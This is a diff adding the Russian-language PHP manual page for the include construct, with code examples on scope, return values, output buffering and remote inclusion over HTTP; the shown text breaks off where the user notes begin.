@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ru">
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>PHP: include - Manual </title>
+
+ <link rel="icon" type="image/svg+xml" sizes="any" href="../../favicon.svg%3Fv=2">
+ <link rel="icon" type="image/png" sizes="196x196" href="../../favicon-196x196.png%3Fv=2">
+ <link rel="icon" type="image/png" sizes="32x32" href="../../favicon-32x32.png%3Fv=2">
+ <link rel="icon" type="image/png" sizes="16x16" href="../../favicon-16x16.png%3Fv=2">
+ <link rel="shortcut icon" href="../../favicon.ico%3Fv=2">
+
+ <link rel="search" type="application/opensearchdescription+xml" href="http://php.net/phpnetimprovedsearch.src" title="Add PHP.net search">
+ <link rel="alternate" type="application/atom+xml" href="https://www.php.net/releases/feed.php" title="PHP Release feed">
+ <link rel="alternate" type="application/atom+xml" href="https://www.php.net/feed.atom" title="PHP: Hypertext Preprocessor">
+
+ <link rel="canonical" href="function.include.php.html">
+ <link rel="shorturl" href="https://www.php.net/include">
+ <link rel="alternate" href="https://www.php.net/include" hreflang="x-default">
+
+ <link rel="contents" href="index.php.html">
+ <link rel="index" href="language.control-structures.php.html">
+ <link rel="prev" href="function.require.php.html">
+ <link rel="next" href="function.require-once.php.html">
+
+ <link rel="alternate" href="https://www.php.net/manual/en/function.include.php" hreflang="en">
+ <link rel="alternate" href="https://www.php.net/manual/de/function.include.php" hreflang="de">
+ <link rel="alternate" href="https://www.php.net/manual/es/function.include.php" hreflang="es">
+ <link rel="alternate" href="https://www.php.net/manual/fr/function.include.php" hreflang="fr">
+ <link rel="alternate" href="https://www.php.net/manual/it/function.include.php" hreflang="it">
+ <link rel="alternate" href="https://www.php.net/manual/ja/function.include.php" hreflang="ja">
+ <link rel="alternate" href="https://www.php.net/manual/pt_BR/function.include.php" hreflang="pt_BR">
+ <link rel="alternate" href="function.include.php.html" hreflang="ru">
+ <link rel="alternate" href="https://www.php.net/manual/tr/function.include.php" hreflang="tr">
+ <link rel="alternate" href="https://www.php.net/manual/zh/function.include.php" hreflang="zh">
+
+<link rel="stylesheet" type="text/css" href="../../cached.php%3Ft=1689765002&amp;f=%252Ffonts%252FFira%252Ffira.css" media="screen">
+<link rel="stylesheet" type="text/css" href="../../cached.php%3Ft=1700771401&amp;f=%252Ffonts%252FFont-Awesome%252Fcss%252Ffontello.css" media="screen">
+<link rel="stylesheet" type="text/css" href="../../cached.php%3Ft=1705413607&amp;f=%252Fstyles%252Ftheme-base.css" media="screen">
+<link rel="stylesheet" type="text/css" href="../../cached.php%3Ft=1701958202&amp;f=%252Fstyles%252Ftheme-medium.css" media="screen">
+
+ <base href="">
+
+
+</head>
+<body class="docs ">
+
+<nav id="head-nav" class="navbar navbar-fixed-top">
+  <div class="navbar-inner clearfix">
+    <a href="https://www.php.net/" class="brand"><img src="../../images/logos/php-logo.svg" width="48" height="24" alt="php"></a>
+    <div id="mainmenu-toggle-overlay"></div>
+    <input type="checkbox" id="mainmenu-toggle">
+    <ul class="nav">
+      <li class=""><a href="https://www.php.net/downloads">Downloads</a></li>
+      <li class="active"><a href="https://www.php.net/docs.php">Documentation</a></li>
+      <li class=""><a href="https://www.php.net/get-involved" >Get Involved</a></li>
+      <li class=""><a href="https://www.php.net/support">Help</a></li>
+      <li class="">
+        <a href="https://www.php.net/releases/8.3/index.php">
+          <img src="../../images/php8/logo_php8_3.svg" alt="php8.3" height="22" width="60">
+        </a>
+      </li>
+    </ul>
+    <form class="navbar-search" id="topsearch" action="https://www.php.net/search.php">
+      <input type="hidden" name="show" value="quickref">
+      <input type="search" name="pattern" class="search-query" placeholder="Search" accesskey="s">
+    </form>
+  </div>
+  <div id="flash-message"></div>
+</nav>
+<div class="headsup"><a href='https://www.php.net/conferences/index.php#2024-02-13-1'>Dutch PHP Conference 2024</a></div>
+<nav id="trick"><div><dl>
+<dt><a href='https://www.php.net/manual/en/getting-started.php'>Getting Started</a></dt>
+	<dd><a href='https://www.php.net/manual/en/introduction.php'>Introduction</a></dd>
+	<dd><a href='https://www.php.net/manual/en/tutorial.php'>A simple tutorial</a></dd>
+<dt><a href='https://www.php.net/manual/en/langref.php'>Language Reference</a></dt>
+	<dd><a href='https://www.php.net/manual/en/language.basic-syntax.php'>Basic syntax</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.types.php'>Types</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.variables.php'>Variables</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.constants.php'>Constants</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.expressions.php'>Expressions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.operators.php'>Operators</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.control-structures.php'>Control Structures</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.functions.php'>Functions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.oop5.php'>Classes and Objects</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.namespaces.php'>Namespaces</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.enumerations.php'>Enumerations</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.errors.php'>Errors</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.exceptions.php'>Exceptions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.fibers.php'>Fibers</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.generators.php'>Generators</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.attributes.php'>Attributes</a></dd>
+	<dd><a href='https://www.php.net/manual/en/language.references.php'>References Explained</a></dd>
+	<dd><a href='https://www.php.net/manual/en/reserved.variables.php'>Predefined Variables</a></dd>
+	<dd><a href='https://www.php.net/manual/en/reserved.exceptions.php'>Predefined Exceptions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/reserved.interfaces.php'>Predefined Interfaces and Classes</a></dd>
+	<dd><a href='https://www.php.net/manual/en/reserved.attributes.php'>Predefined Attributes</a></dd>
+	<dd><a href='https://www.php.net/manual/en/context.php'>Context options and parameters</a></dd>
+	<dd><a href='https://www.php.net/manual/en/wrappers.php'>Supported Protocols and Wrappers</a></dd>
+</dl>
+<dl>
+<dt><a href='https://www.php.net/manual/en/security.php'>Security</a></dt>
+	<dd><a href='https://www.php.net/manual/en/security.intro.php'>Introduction</a></dd>
+	<dd><a href='https://www.php.net/manual/en/security.general.php'>General considerations</a></dd>
+	<dd><a href='https://www.php.net/manual/en/security.cgi-bin.php'>Installed as CGI binary</a></dd>
+	<dd><a href='https://www.php.net/manual/en/security.apache.php'>Installed as an Apache module</a></dd>
+	<dd><a href='https://www.php.net/manual/en/security.sessions.php'>Session Security</a></dd>
+	<dd><a href='https://www.php.net/manual/en/security.filesystem.php'>Filesystem Security</a></dd>
+	<dd><a href='https://www.php.net/manual/en/security.database.php'>Database Security</a></dd>
+	<dd><a href='https://www.php.net/manual/en/security.errors.php'>Error Reporting</a></dd>
+	<dd><a href='https://www.php.net/manual/en/security.variables.php'>User Submitted Data</a></dd>
+	<dd><a href='https://www.php.net/manual/en/security.hiding.php'>Hiding PHP</a></dd>
+	<dd><a href='https://www.php.net/manual/en/security.current.php'>Keeping Current</a></dd>
+<dt><a href='https://www.php.net/manual/en/features.php'>Features</a></dt>
+	<dd><a href='https://www.php.net/manual/en/features.http-auth.php'>HTTP authentication with PHP</a></dd>
+	<dd><a href='https://www.php.net/manual/en/features.cookies.php'>Cookies</a></dd>
+	<dd><a href='https://www.php.net/manual/en/features.sessions.php'>Sessions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/features.xforms.php'>Dealing with XForms</a></dd>
+	<dd><a href='https://www.php.net/manual/en/features.file-upload.php'>Handling file uploads</a></dd>
+	<dd><a href='https://www.php.net/manual/en/features.remote-files.php'>Using remote files</a></dd>
+	<dd><a href='https://www.php.net/manual/en/features.connection-handling.php'>Connection handling</a></dd>
+	<dd><a href='https://www.php.net/manual/en/features.persistent-connections.php'>Persistent Database Connections</a></dd>
+	<dd><a href='https://www.php.net/manual/en/features.commandline.php'>Command line usage</a></dd>
+	<dd><a href='https://www.php.net/manual/en/features.gc.php'>Garbage Collection</a></dd>
+	<dd><a href='https://www.php.net/manual/en/features.dtrace.php'>DTrace Dynamic Tracing</a></dd>
+</dl>
+<dl>
+<dt><a href='https://www.php.net/manual/en/funcref.php'>Function Reference</a></dt>
+	<dd><a href='https://www.php.net/manual/en/refs.basic.php.php'>Affecting PHP's Behaviour</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.utilspec.audio.php'>Audio Formats Manipulation</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.remote.auth.php'>Authentication Services</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.utilspec.cmdline.php'>Command Line Specific Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.compression.php'>Compression and Archive Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.crypto.php'>Cryptography Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.database.php'>Database Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.calendar.php'>Date and Time Related Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.fileprocess.file.php'>File System Related Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.international.php'>Human Language and Character Encoding Support</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.utilspec.image.php'>Image Processing and Generation</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.remote.mail.php'>Mail Related Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.math.php'>Mathematical Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.utilspec.nontext.php'>Non-Text MIME Output</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.fileprocess.process.php'>Process Control Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.basic.other.php'>Other Basic Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.remote.other.php'>Other Services</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.search.php'>Search Engine Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.utilspec.server.php'>Server Specific Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.basic.session.php'>Session Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.basic.text.php'>Text Processing</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.basic.vartype.php'>Variable and Type Related Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.webservice.php'>Web Services</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.utilspec.windows.php'>Windows Only Extensions</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.xml.php'>XML Manipulation</a></dd>
+	<dd><a href='https://www.php.net/manual/en/refs.ui.php'>GUI Extensions</a></dd>
+</dl>
+<dl>
+<dt>Keyboard Shortcuts</dt><dt>?</dt>
+<dd>This help</dd>
+<dt>j</dt>
+<dd>Next menu item</dd>
+<dt>k</dt>
+<dd>Previous menu item</dd>
+<dt>g p</dt>
+<dd>Previous man page</dd>
+<dt>g n</dt>
+<dd>Next man page</dd>
+<dt>G</dt>
+<dd>Scroll to bottom</dd>
+<dt>g g</dt>
+<dd>Scroll to top</dd>
+<dt>g h</dt>
+<dd>Goto homepage</dd>
+<dt>g s</dt>
+<dd>Goto search<br>(current page)</dd>
+<dt>/</dt>
+<dd>Focus search box</dd>
+</dl></div></nav>
+<div id="goto">
+    <div class="search">
+         <div class="text"></div>
+         <div class="results"><ul></ul></div>
+   </div>
+</div>
+
+  <div id="breadcrumbs" class="clearfix">
+    <div id="breadcrumbs-inner">
+          <div class="next">
+        <a href="function.require-once.php.html">
+          require_once &raquo;
+        </a>
+      </div>
+              <div class="prev">
+        <a href="function.require.php.html">
+          &laquo; require        </a>
+      </div>
+          <ul>
+            <li><a href='index.php.html'>Руководство по PHP</a></li>      <li><a href='langref.php.html'>Справочник языка</a></li>      <li><a href='language.control-structures.php.html'>Управляющие конструкции</a></li>      </ul>
+    </div>
+  </div>
+
+
+
+
+<div id="layout" class="clearfix">
+  <section id="layout-content">
+  <div class="page-tools">
+    <div class="change-language">
+      <form action="https://www.php.net/manual/change.php" method="get" id="changelang" name="changelang">
+        <fieldset>
+          <label for="changelang-langs">Change language:</label>
+          <select onchange="document.changelang.submit()" name="page" id="changelang-langs">
+            <option value='en/function.include.php'>English</option>
+            <option value='de/function.include.php'>German</option>
+            <option value='es/function.include.php'>Spanish</option>
+            <option value='fr/function.include.php'>French</option>
+            <option value='it/function.include.php'>Italian</option>
+            <option value='ja/function.include.php'>Japanese</option>
+            <option value='pt_BR/function.include.php'>Brazilian Portuguese</option>
+            <option value='ru/function.include.php' selected="selected">Russian</option>
+            <option value='tr/function.include.php'>Turkish</option>
+            <option value='zh/function.include.php'>Chinese (Simplified)</option>
+            <option value='help-translate.php'>Other</option>
+          </select>
+        </fieldset>
+      </form>
+    </div>
+    <div class="edit-bug">
+      <a href="https://github.com/php/doc-ru/blob/master/language/control-structures/include.xml">Submit a Pull Request</a>
+      <a href="https://github.com/php/doc-ru/issues/new?body=From%20manual%20page:%20https:%2F%2Fphp.net%2Ffunction.include%0A%0A---">Report a Bug</a>
+    </div>
+  </div><div id="function.include" class="sect1">
+ <h2 class="title">include</h2>
+ <p class="verinfo">(PHP 4, PHP 5, PHP 7, PHP 8)</p>
+ <p class="simpara">
+  Выражение <code class="literal">include</code> включает и выполняет
+  указанный файл.
+ </p>
+ <p class="simpara">
+  Документация ниже также относится к выражению <span class="function"><a href="function.require.php.html" class="function">require</a></span>.
+ </p>
+ <p class="simpara">
+  Файлы включаются исходя из пути указанного файла, или, если путь не указан,
+  используется путь, указанный в директиве <a href="ini.core.php.html#ini.include-path" class="link">include_path</a>. Если файл
+  не найден в <a href="ini.core.php.html#ini.include-path" class="link">include_path</a>,
+  <code class="literal">include</code> попытается проверить директорию, в которой находится текущий включающий скрипт
+  и текущую рабочую директорию перед тем, как выдать ошибку. Конструкция
+  <code class="literal">include</code> выдаст <strong><code>E_WARNING</code></strong>, если
+  не сможет найти файл; поведение отлично от <span class="function"><a href="function.require.php.html" class="function">require</a></span>, который выдаст
+  <strong><code>E_ERROR</code></strong>.
+ </p>
+ <p class="simpara">
+  Обратите внимание, что и <code class="literal">include</code> и <code class="literal">require</code>
+  выдают дополнительную ошибку уровня <strong><code>E_WARNING</code></strong>, если к файлу невозможно
+  получить доступ, перед тем, как выдать последнюю ошибку уровня
+  <strong><code>E_WARNING</code></strong> или <strong><code>E_ERROR</code></strong> соответственно.
+ </p>
+ <p class="simpara">
+  Если путь указан — абсолютный (начинающийся с буквы диска или с
+  <code class="literal">\</code> в Windows или с <code class="literal">/</code> в Unix/Linux
+  системах) или относительно текущей директории (начинающийся с
+  <code class="literal">.</code> или <code class="literal">..</code>) —
+  <a href="ini.core.php.html#ini.include-path" class="link">include_path</a> будет проигнорирован вообще.
+  Например, если имя файла начинается с <code class="literal">../</code>,
+  парсер будет искать в родительской директории запрошенный файл.
+ </p>
+ <p class="simpara">
+  Для дополнительной информации о том, как PHP обрабатывает включаемые файлы и включаемые пути,
+  смотрите документацию для директивы <a href="ini.core.php.html#ini.include-path" class="link">include_path</a>.
+ </p>
+ <p class="simpara">
+  Когда файл включается, его код наследует ту же
+  <a href="language.variables.scope.php.html" class="link">область видимости переменных</a>, что
+  и строка, на которой произошло включение.  Все переменные, доступные на этой строке
+  во включающем файле, будут также доступны во включаемом файле.
+  Однако все функции и классы, объявленные во включаемом файле, имеют
+  глобальную область видимости.
+ </p>
+ <p class="para">
+  <div class="example" id="context.zip.example-password">
+   <p><strong>Пример #1 Простой пример <code class="literal">include</code></strong></p>
+   <div class="example-contents">
+<div class="phpcode"><code><span style="color: #000000">vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color </span><span style="color: #007700">= </span><span style="color: #DD0000">'зелёное'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$fruit </span><span style="color: #007700">= </span><span style="color: #DD0000">'яблоко'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />test.php<br /><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">echo </span><span style="color: #DD0000">"Одно </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">; </span><span style="color: #FF8000">// Одно<br /><br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #DD0000">"Одно </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">; </span><span style="color: #FF8000">// Одно зелёное яблоко<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
+   </div>
+
+  </div>
+ </p>
+ <p class="simpara">
+  Если включение происходит внутри функции включающего файла,
+  тогда весь код, содержащийся во включаемом файле, будет вести себя так,
+  как будто он был определён внутри этой функции.  То есть, он будет в той же области видимости
+  переменных этой функции.
+  Исключением к этому правилу являются <a href="language.constants.predefined.php.html" class="link">магические константы</a>, которые
+  выполняются парсером перед тем, как происходит включение.
+ </p>
+ <p class="para">
+  <div class="example" id="example-421">
+   <p><strong>Пример #2 Включение внутри функции</strong></p>
+   <div class="example-contents">
+<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">function </span><span style="color: #0000BB">foo</span><span style="color: #007700">()<br />{<br />    global </span><span style="color: #0000BB">$color</span><span style="color: #007700">;<br /><br />    include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />    echo </span><span style="color: #DD0000">"Одно </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">/* vars.php в той же области видимости, что и foo(),  *<br />* поэтому $fruit НЕ будет доступен за пределами этой области     *<br />* $color доступен, поскольку мы объявили переменную глобальной */<br /><br /></span><span style="color: #0000BB">foo</span><span style="color: #007700">();                    </span><span style="color: #FF8000">// Одно зелёное яблоко<br /></span><span style="color: #007700">echo </span><span style="color: #DD0000">"Одно </span><span style="color: #0000BB">$color</span><span style="color: #DD0000"> </span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;   </span><span style="color: #FF8000">// Одно зелёное<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
+   </div>
+
+  </div>
+ </p>
+ <p class="simpara">
+  Когда файл включается, парсинг в режиме PHP-кода прекращается и переключается
+  в режим HTML в начале указанного файла и продолжается
+  снова в конце.  По этой причине любой код внутри включаемого файла,
+  который должен быть выполнен как код PHP, должен быть заключён в
+  <a href="language.basic-syntax.phpmode.php.html" class="link">корректные теги начала и конца PHP-кода</a>.
+ </p>
+ <p class="simpara">
+  Если &quot;<a href="filesystem.configuration.php.html#ini.allow-url-include" class="link">обёртки URL include</a>&quot;
+  включены в PHP, вы можете также указать файл для включения через URL (с помощью HTTP или
+  других поддерживающихся обработчиков - смотрите <a href="wrappers.php.html" class="xref">Поддерживаемые протоколы и обёртки</a> для списка
+  протоколов) вместо локального пути.  Если целевой сервер интерпретирует
+  указанный файл как код PHP, переменные могут быть переданы во включаемый файл
+  с помощью строки URL-запроса при использовании HTTP GET. Это совсем не то же самое,
+  что включение файла и наследование родительской области видимости; скрипт
+  выполняется на удалённом сервере, и результат затем
+  включается в локальный скрипт.
+ </p>
+ <p class="para">
+  <div class="example" id="example-424">
+   <p><strong>Пример #3 Пример <code class="literal">include</code> через HTTP</strong></p>
+   <div class="example-contents">
+<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #FF8000">/* В этом примере предполагается, что www.example.com настроен на обработку .php<br />* файлов, но не .txt. Также, 'Сработает' обозначает, что переменные<br />* $foo и $bar доступны внутри включаемого файла. */<br /><br />// Не сработает; file.txt не обрабатывается www.example.com как PHP<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'http://www.example.com/file.txt?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">// Не сработает; будет искать файл 'file.php?foo=1&amp;bar=2' в<br />// локальной файловой системе.<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">// Сработает.<br /></span><span style="color: #007700">include </span><span style="color: #DD0000">'http://www.example.com/file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
+   </div>
+
+  </div>
+ </p>
+ <div class="warning"><strong class="warning">Внимание</strong>
+  <h1 class="title">Предупреждение безопасности</h1>
+  <p class="para">
+   Удалённые файлы могут быть обработаны на удалённой стороне (в зависимости от
+   расширения файла и того, что удалённый сервер выполняет скрипты PHP или нет), но это всё равно
+   должно производить корректный скрипт PHP, потому что он будет затем обработан уже на
+   локальном сервере. Если файл с удалённого сервера должен быть обработан
+   и только отображён его результат, гораздо эффективно воспользоваться функцией <span class="function"><a href="function.readfile.php.html" class="function">readfile()</a></span>
+   В противном случае следует соблюдать особую осторожность, чтобы обезопасить
+   удалённый скрипт для получения корректного и желаемого кода.
+  </p>
+ </div>
+ <p class="para">
+  Смотрите также раздел <a href="features.remote-files.php.html" class="link">Удалённые файлы</a>, функции
+  <span class="function"><a href="function.fopen.php.html" class="function">fopen()</a></span> и <span class="function"><a href="function.file.php.html" class="function">file()</a></span> для дополнительной
+  информации.
+ </p>
+ <p class="simpara">
+  Обработка возвращаемых значений: оператор <code class="literal">include</code> возвращает
+  значение <code class="literal">FALSE</code> в случае возникновения ошибки и выдаёт предупреждение. Успешные
+  включения, пока это не переопределено во включаемом файле, возвращают значение
+  <code class="literal">1</code>. Возможно выполнить выражение <span class="function"><a href="function.return.php.html" class="function">return</a></span>
+  внутри включаемого файла, чтобы завершить процесс выполнения в
+  этом файле и вернуться к выполнению включающего файла. Кроме того, возможно вернуть
+  значение из включаемых файлов. Вы можете получить значение включения, как
+  если бы вы вызвали обычную функцию. Хотя это невозможно при включении
+  удалённого файла, только если вывод удалённого файла не содержит
+  <a href="language.basic-syntax.phpmode.php.html" class="link">корректные теги начала и конца PHP
+  кода</a> (так же, как и локальный файл). Вы можете определить необходимые
+  переменные внутри этих тегов и они будут представлены в зависимости от того,
+  какой файл был выключен.
+ </p>
+ <p class="para">
+  Так как <code class="literal">include</code> - это специальная языковая конструкция,
+  круглые скобки не обязательны вокруг аргумента. Будьте внимательны при сравнении
+  возвращаемого значения.
+  <div class="example" id="example-427">
+   <p><strong>Пример #4 Сравнение возвращаемого значения при include</strong></p>
+   <div class="example-contents">
+<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">// не сработает, интерпретируется как include(('vars.php') == TRUE), то есть include('1')<br /></span><span style="color: #007700">if (include(</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">) == </span><span style="color: #0000BB">TRUE</span><span style="color: #007700">) {<br />    echo </span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">// сработает<br /></span><span style="color: #007700">if ((include </span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">) == </span><span style="color: #0000BB">TRUE</span><span style="color: #007700">) {<br />    echo </span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
+   </div>
+
+  </div>
+ </p>
+ <p class="para">
+  <div class="example" id="example-430">
+   <p><strong>Пример #5 Выражения <code class="literal">include</code> и <span class="function"><a href="function.return.php.html" class="function">return</a></span></strong></p>
+   <div class="example-contents">
+<div class="phpcode"><code><span style="color: #000000">return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var </span><span style="color: #007700">= </span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br />return </span><span style="color: #0000BB">$var</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />noreturn.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var </span><span style="color: #007700">= </span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />testreturns.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$foo </span><span style="color: #007700">= include </span><span style="color: #DD0000">'return.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #0000BB">$foo</span><span style="color: #007700">; </span><span style="color: #FF8000">// выведет 'PHP'<br /><br /></span><span style="color: #0000BB">$bar </span><span style="color: #007700">= include </span><span style="color: #DD0000">'noreturn.php'</span><span style="color: #007700">;<br /><br />echo </span><span style="color: #0000BB">$bar</span><span style="color: #007700">; </span><span style="color: #FF8000">// выведет 1<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
+   </div>
+
+  </div>
+ </p>
+ <p class="simpara">
+  <code class="literal">$bar</code> имеет значение <code class="literal">1</code>, т.к. включение файла произошло
+  успешно.  Заметьте разницу между примерами сверху. Первый использует
+  <span class="function"><a href="function.return.php.html" class="function">return</a></span> внутри включаемого файла, тогда как второй не использует.
+  Если файл не может быть включён, возвращается <strong><code>false</code></strong> и возникает
+  <strong><code>E_WARNING</code></strong>.
+ </p>
+ <p class="para">
+  Если во включаемом файле определены функции, они могут быть использованы в
+  главном файле вне зависимости от того, были ли они объявлены до <span class="function"><a href="function.return.php.html" class="function">return</a></span> или после.
+  Если файл включается дважды, PHP выдаст фатальную ошибку, потому что функции
+  уже были определены.
+  Рекомендуется использовать <span class="function"><a href="function.include-once.php.html" class="function">include_once</a></span> вместо того, чтобы
+  проверять был ли файл уже включён.
+ </p>
+ <p class="simpara">
+  Другой путь &quot;включить&quot; PHP-файл в переменную - это захватить
+  вывод с помощью <a href="ref.outcontrol.php.html" class="link">функций контроля вывода</a>
+  вместе с <code class="literal">include</code>. Например:
+ </p>
+ <p class="para">
+  <div class="example" id="example-433">
+   <p><strong>Пример #6 Использование буферизации вывода для включения файла PHP в строку</strong></p>
+   <div class="example-contents">
+<div class="phpcode"><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php<br />$string </span><span style="color: #007700">= </span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'somefile.php'</span><span style="color: #007700">);<br /><br />function </span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">) {<br />    if (</span><span style="color: #0000BB">is_file</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">)) {<br />        </span><span style="color: #0000BB">ob_start</span><span style="color: #007700">();<br />        include </span><span style="color: #0000BB">$filename</span><span style="color: #007700">;<br />        return </span><span style="color: #0000BB">ob_get_clean</span><span style="color: #007700">();<br />    }<br />    return </span><span style="color: #0000BB">false</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #0000BB">?&gt;</span></span></code></div>
+   </div>
+
+  </div>
+ </p>
+ <p class="para">
+  Для того, чтобы включать файлы автоматически в скрипты, обратите внимание на конфигурационные директивы
+  <a href="ini.core.php.html#ini.auto-prepend-file" class="link">auto_prepend_file</a> и
+  <a href="ini.core.php.html#ini.auto-append-file" class="link">auto_append_file</a>
+  в <var class="filename">php.ini</var>.
+ </p>
+
+ <blockquote class="note"><p><strong class="note">Замечание</strong>: <span class="simpara">Поскольку это языковая конструкция, а не функция,
+её нельзя вызывать как <a href="functions.variable-functions.php.html" class="link">переменную функцию</a>
+или передавать как <a href="functions.arguments.php.html#functions.named-arguments" class="link">именованный аргумент</a>.</span>
+</p></blockquote>
+
+ <p class="simpara">
+  Смотрите также <span class="function"><a href="function.require.php.html" class="function">require</a></span>, <span class="function"><a href="function.require-once.php.html" class="function">require_once</a></span>,
+  <span class="function"><a href="function.include-once.php.html" class="function">include_once</a></span>, <span class="function"><a href="function.get-included-files.php.html" class="function">get_included_files()</a></span>,
+  <span class="function"><a href="function.readfile.php.html" class="function">readfile()</a></span>, <span class="function"><a href="function.virtual.php.html" class="function">virtual()</a></span> и
+  <a href="ini.core.php.html#ini.include-path" class="link">include_path</a>.
+ </p>
+</div><section id="usernotes">
+ <div class="head">
+  <span class="action"><a href="https://www.php.net/manual/add-note.php?sect=function.include&amp;redirect=https://www.php.net/manual/ru/function.include.php">＋<small>add a note</small></a></span>
+  <h3 class="title">User Contributed Notes <span class="count">13 notes</span></h3>
+ </div><div id="allnotes">
+  <div class="note" id="86842">  <div class="votes">
+    <div id="Vu86842">
+    <a href="https://www.php.net/manual/vote-note.php?id=86842&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd86842">
+    <a href="https://www.php.net/manual/vote-note.php?id=86842&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V86842" title="61% like this...">
+    149
+    </div>
+  </div>
+  <a href="function.include.php.html#86842" class="name">
+  <strong class="user"><em>snowyurik at gmail dot com</em></strong></a><a class="genanchor" href="function.include.php.html#86842"> &para;</a><div class="date" title="2008-11-05 10:49"><strong>15 years ago</strong></div>
+  <div class="text" id="Hcom86842">
